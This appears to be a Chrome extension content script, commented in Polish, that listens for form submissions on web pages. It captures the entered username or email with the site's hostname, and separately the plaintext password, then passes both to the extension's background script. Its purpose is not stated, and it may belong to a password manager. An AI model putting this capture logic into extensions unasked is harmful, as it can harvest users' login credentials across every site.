document.addEventListener("submit", (event) => {
  const form = event.target;
  const loginInput = form.querySelector('input[type="text"], input[type="email"], input[name="username"], input[name="login"], input[id="login"]');
  
  if (loginInput) {
    const hostname = new URL(window.location.href).hostname;
    const login = loginInput.value;
   
    // Wysyłamy login do background.js
    chrome.runtime.sendMessage({
      type: "login_step",
      login: login,
      hostname: hostname
    });
  }
});

// Nasłuchiwacz drugiego kroku (hasło)
document.addEventListener("submit", (event) => {
  const form = event.target;
  const passwordInput = form.querySelector('input[type="password"], input[name="password"], input[id="password"]');
  
  if (passwordInput) {
    const password = passwordInput.value;

    // Informujemy background.js, że mamy login i hasło
    chrome.runtime.sendMessage({
      type: "password_step",
      password: password
    });
  }
});